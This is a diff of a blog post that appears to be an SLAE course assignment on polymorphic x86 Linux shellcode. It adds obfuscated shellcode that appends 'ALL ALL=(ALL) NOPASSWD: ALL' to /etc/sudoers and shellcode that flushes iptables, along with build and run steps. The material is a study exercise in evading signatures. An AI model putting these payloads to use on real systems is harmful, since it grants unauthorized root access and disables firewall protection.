@@ -291,10 +291,113 @@ _start:
 
 
 									<p>
-										The &nbsp;Below is the output!
+										Compile with the usual gcc command (<code>gcc -fno-stack-protector -z execstack harness.c -o harness</code>). &nbsp;Run the binary
+										with sudo and check the output in <i>/etc/sudoers</i>! &nbsp;Check before and after running the binary to confirm the line was
+										correctly written. &nbsp;Once complete, use <code>pkexec visudo</code> to remove the malicious line.
 									</p>
 									<center><div class="image post"><img src="../images/slae/assignment6/sudoers-harness.gif" alt="" /></div></center><br>
 
+									<p>
+										The final <i>/etc/sudoers</i> code is below at a size of 128 opcode bytes:
+									</p>
+									<pre>
+										<code class="x86asm" style=display:block;white-space:pre-wrap>
+; Linux/x86 - edit /etc/sudoers for full access - 128 bytes
+; http://shell-storm.org/shellcode/files/shellcode-62.php
+; Original author: Rick
+; New author: John
+
+section .text
+	global _start
+
+_start:
+
+	;open("/etc/sudoers", O_WRONLY | O_APPEND);
+	xor eax, eax
+	push eax
+
+	;push 0x7372656f		; "sreo"
+	push 0x85a6bbe7
+	sub dword [esp], 0x12345678
+
+	;push 0x6475732f		; "dus/"
+	mov eax, 0x4d3d1d1f
+	add eax, 0x17385610
+	push eax
+
+	;push 0x6374652f		; "cte/"
+	mov dword [esp-4], 0x6374652f
+	sub esp, 4
+
+	cld				; nonsense
+	mov ebx, esp
+
+	;mov cx, 0x401
+	sub eax, 0x64756f2e
+	mov ecx, eax			; ecx = flag values
+
+	;mov al, 0x05
+	push byte 0x5
+	pop eax				; eax = open() syscall
+
+	int 0x80			; syscall
+	xchg ebx, eax			; ebx = file descriptor
+
+	;write(fd, ALL ALL=(ALL) NOPASSWD: ALL\n, len);
+	xor edx, edx
+	push edx
+
+	;push 0x0a4c4c41		; "\nLLA"
+	mov eax, 0x1f605f53
+	sub eax, 0x15141312
+	push eax
+
+	;push 0x203a4457         	; " :DW"
+	add eax, 0x15edf816
+	push eax
+
+	;push 0x53534150		; "SSAP"
+	add eax, 0x3318fcf9
+	push eax
+
+	;push 0x4f4e2029		; "ON )"
+	add eax, 0xfbfaded9
+	push eax
+
+	;push 0x4c4c4128		; "LLA("
+	sub eax, 0x0301df01
+	push eax
+
+	;push 0x3d4c4c41		; "=LLA"
+	sub eax, 0x0efff4e7
+	push eax
+
+	;push 0x204c4c41		; " LLA"
+	mov eax, 0x0d1ad910
+	add eax, 0x13317331
+	push eax
+
+	mov ecx, esp			; ecx points to "ALL ALL=(ALL) NOPASSWD: ALL\n"
+
+	;mov dl, 0x1c
+	push byte 0x1c
+	pop edx				; edx = 28
+
+	;mov al, 0x04
+	push byte 0x4
+	pop eax				; eax = 4 = syscall write()
+	int 0x80					; syscall
+
+	;close(file)			; ebx still = file descriptor
+	mov al, 0x06			; eax = close() syscall
+	int 0x80
+
+	;exit(0);
+	xor ebx, ebx
+	mov al, 0x01
+	int 0x80
+										</code>
+									</pre>
 
 
 
@@ -316,22 +419,24 @@ _start:
 									</p>.
 									<pre>
 										<code class="x86asm" style=display:block;white-space:pre-wrap>
+; original size: 58 bytes
+
 	jmp short callme
 
 main:
-	pop esi				; esi = '/sbin/iptables#-F#'
-	xor eax,eax
-	mov byte [esi+14],al		; '#' replaced with 0
-	mov byte [esi+17],al		; '#' replaced with 0
-	mov long [esi+18],esi		; esi = '/sbin/iptables0-F0/sbin/iptables0-F0'
-	lea ebx,[esi+15]				; ebx points to '-F0/sbin/iptables0-F0'
-	mov long [esi+22],ebx		;
-	mov long [esi+26],eax
-	mov al,0x0b
-	mov ebx,esi
-	lea ecx,[esi+18]
-	lea edx,[esi+26]
-	int 0x80
+	pop esi				; esi points to '/sbin/iptables#-F#'
+	xor eax,eax			; eax = 0
+	mov byte [esi+14],al		; '#' replaced with \0
+	mov byte [esi+17],al		; '#' replaced with \0
+	mov long [esi+18],esi		; esi points to '/sbin/iptables0-F0[ptr to '/sbin/iptables']'
+	lea ebx,[esi+15]		; ebx points to '-F\0/sbin/iptables\0-F\0'
+	mov long [esi+22],ebx		; esi points to '/sbin/iptables\0-F\0[ptr to '/sbin/iptables'][ptr to '-F']'
+	mov long [esi+26],eax		; NULL terminate '-F'
+	mov al,0x0b			; eax = execve() syscall
+	mov ebx,esi			; ebx points to '/sbin/iptables\0'
+	lea ecx,[esi+18]		; ecx points to an array of pointers which points to ['/sbin/iptables', '-F']
+	lea edx,[esi+26]		; edx points to NULL
+	int 0x80			; syscall
 
 
 callme:
@@ -340,9 +445,66 @@ callme:
 										</code>
 									</pre>
 
-
+									<p>
+										The above code starts with a familiar JMP-CALL-POP routine to load what appears to be the terminal instruction into
+										<i>esi</i>. &nbsp;Certain values in the string are overwritten with NULL bytes to split arguments. &nbsp;Arguments
+										 are subsequently set up for a call to
+										<a href="https://man7.org/linux/man-pages/man2/execve.2.html" target="_blank" style="color:blue;"><i>execve()</i></a>.
+										&nbsp;Based on the above code, arguments are set up like this:<br>
+										 <code>execve(*'/sbin/iptables', *[*'/sbin/iptables', *'-F'], *NULL)</code>.
+										&nbsp;
+									</p>
 									<center><div class="image post"><img src="../images/slae/assignment6/.png" alt="" /></div></center><br>
 
+
+
+
+
+
+
+
+
+
+
+									<p>
+										The final <code>iptables -F</code> code is below at a size of 56 opcode bytes:
+									</p>
+									<pre>
+										<code class="x86asm" style=display:block;white-space:pre-wrap>
+; The shellcode flushs the iptables  by running /sbin/iptables -F
+; original size: 58 bytes
+; http://shell-storm.org/shellcode/files/shellcode-361.php
+; Original author: dev0id
+; Author: John
+
+jmp	short	callme
+
+main:
+	pop esi				; esi points to '/sbin/iptables'
+	xor eax,eax			; eax = NULL
+	push eax			; push NULL onto stack
+	push esi			; push pointer to '/sbin/iptables'
+	mov ebx, esp			; ebx points to '/sbin/iptables'
+	push eax			; push NULL onto stack
+	push 0xdeadbeef			; push random value onto stack
+	sub dword [esp], 0xde6791ef 	; '\0-F\0' appears on stack
+	mov edx, esp			; edx points to '\0-F\0'
+	push edx			; push -F pointer
+	push ebx			; push '/sbin/iptables' pointer
+	mov ecx, esp 			; ecx points to [*'/sbin/iptables', *'-F']
+	sub edx, edx			; edx = NULL
+	push edx			; push NULL onto stack
+	mov edx, esp			; edx points to NULL
+	mov al, 0x0b			; eax = execve() syscall
+	int 0x80			; syscall
+
+callme:
+	call	main
+	db '/sbin/iptables'
+
+
+										</code>
+									</pre>
 
 
 
@@ -350,7 +512,11 @@ callme:
 		<br><section id="Thoughts"><h2>Thoughts and Lessons Learned</h2></section>
 
 									<p>
-										&emsp; &emsp;Conclusion goes here
+										&emsp; &emsp;Manually creating polymorphic shellcode is a great exercise in determining how such a process can be automated.
+										 &nbsp; <a href="https://nostarch.com/hacking2.htm" target="_blank" style="color:blue;"><i>Hacking: The Art of Exploitation</i></a>
+										 by Jon Erickson has a fantastic tool on page 369 that randomizes arithmetic towards a target value. &nbsp;In that particular
+										 example, DWORD numbers were generated to make printable characters. &nbsp;The last assignment is creating a custom crypter to
+										 decrypt and execute encrypted payloads.
 									</p>
 									<center><div class="image post"><img src="../images/slae/assignment6/.png" alt="" /></div></center><br>
 
